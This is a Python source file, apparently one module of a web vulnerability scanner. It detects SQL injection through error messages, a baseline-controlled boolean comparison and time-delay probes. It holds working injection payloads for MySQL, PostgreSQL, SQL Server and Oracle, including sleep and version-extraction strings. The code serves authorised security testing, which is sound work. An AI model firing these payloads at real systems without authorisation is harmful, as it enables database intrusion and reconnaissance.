"""SQL injection detection — error-based, baseline-controlled boolean, time-based.

Sends only non-destructive probes:
  * a single quote to trigger DB error messages (error-based, DBMS-identified),
  * a baseline/TRUE/FALSE triple so a boolean difference is only reported when
    TRUE matches the baseline AND FALSE diverges (kills dynamic-content FPs),
  * one conservative time-based probe (default 4s) as blind confirmation.
On confirmation it captures the REAL request/response as proof and best-effort
reads the DB version via read-only error/inference — no stacked queries, no data
modification.
"""
from __future__ import annotations

import re
import time
from urllib.parse import urlencode

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity
from core.injection_points import discover_points, send
from core import evidence


def _attack_url(pt, payload):
    """Full GET URL carrying the confirming payload (for browser re-execution)."""
    if pt.method != "GET":
        return None
    params = dict(pt.base_params)
    params[pt.param] = payload
    return pt.base_url + ("?" + urlencode(params) if params else "")

# DBMS-identifying error signatures (real strings) → DBMS name.
_DBMS_ERRORS = [
    ("MySQL", re.compile(r"SQL syntax.*MySQL|Warning.*mysqli?|MySqlException|valid MySQL result|"
                         r"You have an error in your SQL syntax|com\.mysql\.jdbc", re.I)),
    ("PostgreSQL", re.compile(r"PostgreSQL.*ERROR|pg_query\(\)|PG::\w*Error|unterminated quoted string|"
                              r"org\.postgresql\.util\.PSQLException", re.I)),
    ("Microsoft SQL Server", re.compile(r"Microsoft OLE DB Provider for SQL Server|"
                                        r"Unclosed quotation mark after the character string|"
                                        r"System\.Data\.SqlClient\.SqlException|SQLServer JDBC Driver|"
                                        r"Incorrect syntax near", re.I)),
    ("Oracle", re.compile(r"ORA-\d{5}|Oracle error|quoted string not properly terminated|"
                          r"oracle\.jdbc", re.I)),
    ("SQLite", re.compile(r"SQLite/JDBCDriver|SQLiteException|sqlite3\.OperationalError|"
                          r"unrecognized token|SQLite3::", re.I)),
    ("MS Access", re.compile(r"Syntax error.*in query expression|Microsoft JET Database", re.I)),
]

# Read-only version-disclosure payloads (error/inference) per DBMS family.
_VERSION_PAYLOADS = {
    "MySQL": "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "PostgreSQL": "' AND 1=cast(version() as int)-- -",
    "Microsoft SQL Server": "' AND 1=convert(int,@@version)-- -",
    "Oracle": "' AND 1=utl_inaddr.get_host_name((select banner from v$version where rownum=1))-- -",
}
_VERSION_RE = re.compile(r"(\d+\.\d+\.\d+[-.\w]*)|(?:MySQL|PostgreSQL|Microsoft SQL Server|Oracle|SQLite)[^\n]{0,40}", re.I)

# Time-based blind payloads (single delay, non-destructive).
_TIME_PAYLOADS = [
    ("MySQL", "' AND SLEEP({t})-- -"),
    ("MySQL", "'||SLEEP({t})||'"),
    ("PostgreSQL", "';SELECT pg_sleep({t})-- -"),
    ("Microsoft SQL Server", "';WAITFOR DELAY '0:0:{t}'-- -"),
]


def _identify(text: str):
    for name, rx in _DBMS_ERRORS:
        m = rx.search(text or "")
        if m:
            return name, m.group(0)
    return None, None


@register
class SQLInjection(BaseModule):
    id = "sqli"
    name = "SQL Injection (error + boolean + time)"
    category = "Injection"
    description = ("Error-based (DBMS-identified) + baseline-controlled boolean + time-based SQLi; "
                   "captures raw request/response proof and reads DB version (read-only).")

    def _extract_version(self, ctx, pt, dbms):
        payload = _VERSION_PAYLOADS.get(dbms)
        if not payload:
            return None, None
        r = send(ctx, pt, payload)
        if r is None:
            return None, r
        m = _VERSION_RE.search(r.text or "")
        return (m.group(0).strip() if m else None), r

    def _test_point(self, ctx: ScanContext, pt) -> Finding | None:
        base_val = pt.base_params.get(pt.param) or "1"
        base_r = send(ctx, pt, base_val)
        base_text = (base_r.text if base_r is not None else "") or ""
        base_dbms, _ = _identify(base_text)          # error already present in baseline? then not injection

        # 1) Error-based.
        r = send(ctx, pt, base_val + "'")
        if r is not None:
            dbms, sig = _identify(r.text or "")
            if dbms and not base_dbms:
                f = Finding(
                    module_id=self.id, title=f"SQL injection (error-based, {dbms}) in {pt.label()}",
                    severity=Severity.HIGH, url=pt.base_url, confidence="Confirmed",
                    description=f"Injecting a single quote into '{pt.param}' triggered a {dbms} database error, "
                                "confirming the parameter is concatenated into a SQL query.",
                    evidence=f"DBMS: {dbms}\nError signature: {sig!r}",
                    request=f"{pt.method} {pt.base_url}  ({pt.param}={base_val}')",
                    remediation="Use parameterized queries / prepared statements; never concatenate input into SQL.",
                    extra={"chain": {"type": "sqli", "method": pt.method, "base_url": pt.base_url,
                                     "param": pt.param, "base_params": pt.base_params, "where": pt.where}})
                f.extra["attack"] = {"method": pt.method, "url": _attack_url(pt, base_val + "'")}
                # Active proof: capture the real request/response and (read-only) DB version.
                ver, ver_r = (None, None)
                if not ctx.should_stop():
                    ver, ver_r = self._extract_version(ctx, pt, dbms)
                evidence.from_response(f, r, proof={"dbms": dbms, "db_version": ver,
                                                    "technique": "error-based", "param": pt.param})
                if ver:
                    f.evidence += f"\nExtracted DB version: {ver}"
                    f.confidence = "Confirmed"
                return f

        if ctx.should_stop():
            return None

        # 2) Boolean-based with a baseline control (TRUE≈baseline, FALSE diverges).
        rt = send(ctx, pt, f"{base_val}' AND '1'='1")
        rf = send(ctx, pt, f"{base_val}' AND '1'='2")
        if base_r is not None and rt is not None and rf is not None:
            lb, lt, lf = len(base_text), len(rt.text or ""), len(rf.text or "")
            true_like_base = abs(lt - lb) <= max(30, int(0.05 * max(lb, 1)))
            false_diverges = abs(lt - lf) > max(50, int(0.15 * max(lt, 1)))
            if lt > 0 and true_like_base and false_diverges:
                f = Finding(
                    module_id=self.id, title=f"SQL injection (boolean-based) in {pt.label()}",
                    severity=Severity.HIGH, url=pt.base_url, confidence="Firm",
                    description="TRUE payload matched the baseline while FALSE diverged materially — the "
                                "parameter is evaluated inside a SQL boolean condition (blind SQLi).",
                    evidence=f"len(baseline)={lb}  len(TRUE)={lt}  len(FALSE)={lf}  "
                             f"(TRUE≈baseline, FALSE diff={abs(lt-lf)})",
                    request=f"{pt.method} {pt.base_url}  ({pt.param}={base_val}' AND '1'='1  vs  '1'='2)",
                    remediation="Use parameterized queries; validate/whitelist input types.",
                    extra={"chain": {"type": "sqli", "method": pt.method, "base_url": pt.base_url,
                                     "param": pt.param, "base_params": pt.base_params, "where": pt.where}})
                f.extra["attack"] = {"method": pt.method, "url": _attack_url(pt, f"{base_val}' AND '1'='2")}
                evidence.from_response(f, rf, proof={"technique": "boolean-based", "param": pt.param,
                                                     "len_baseline": lb, "len_true": lt, "len_false": lf})
                return f

        if ctx.should_stop() or not ctx.options.get("sqli_time", True):
            return None

        # 3) Time-based blind (one conservative delayed probe).
        delay = int(ctx.options.get("sqli_time_sec", 4))
        # baseline latency
        t0 = time.monotonic(); send(ctx, pt, base_val); base_lat = time.monotonic() - t0
        for dbms, tmpl in _TIME_PAYLOADS:
            if ctx.should_stop():
                break
            t0 = time.monotonic()
            r = send(ctx, pt, base_val + tmpl.format(t=delay))
            elapsed = time.monotonic() - t0
            if r is not None and elapsed >= delay - 0.5 and elapsed > base_lat + delay - 1.0:
                f = Finding(
                    module_id=self.id, title=f"SQL injection (time-based blind, {dbms}) in {pt.label()}",
                    severity=Severity.HIGH, url=pt.base_url, confidence="Firm",
                    description=f"A {dbms} time-delay payload made the response take ~{elapsed:.1f}s vs a "
                                f"{base_lat:.1f}s baseline, confirming blind SQL injection.",
                    evidence=f"DBMS: {dbms}\nBaseline latency: {base_lat:.2f}s\nDelayed ({delay}s) latency: {elapsed:.2f}s",
                    request=f"{pt.method} {pt.base_url}  ({pt.param}={base_val}{tmpl.format(t=delay)})",
                    remediation="Use parameterized queries; never build SQL from user input.",
                    extra={"chain": {"type": "sqli", "method": pt.method, "base_url": pt.base_url,
                                     "param": pt.param, "base_params": pt.base_params, "where": pt.where}})
                f.extra["attack"] = {"method": pt.method, "url": _attack_url(pt, base_val + tmpl.format(t=delay))}
                evidence.from_response(f, r, proof={"technique": "time-based", "dbms": dbms,
                                                    "baseline_s": round(base_lat, 2), "delayed_s": round(elapsed, 2)})
                return f
        return None

    def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        points = discover_points(ctx)
        if not points:
            ctx.log("    no injectable points found")
            return findings
        ctx.log(f"    testing {len(points)} point(s): error + boolean(baseline) + time-based")
        for pt in points:
            if ctx.should_stop():
                break
            f = self._test_point(ctx, pt)
            if f:
                findings.append(f)
        return findings
